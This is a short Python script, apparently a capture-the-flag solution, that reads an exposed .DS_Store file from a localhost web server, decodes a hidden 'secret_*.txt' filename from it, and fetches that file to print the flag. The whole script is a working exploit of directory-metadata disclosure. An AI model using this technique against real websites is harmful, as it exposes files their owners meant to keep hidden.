import requests
import re

host = 'http://localhost:80'
r = requests.get(f'{host}/.DS_Store')
secret_file = re.search(r'(s.e.c.r.e.t._.*\..t.x.t)', r.text).group(1)[0::2]
flag = requests.get(f'{host}/{secret_file}').text
print(flag)
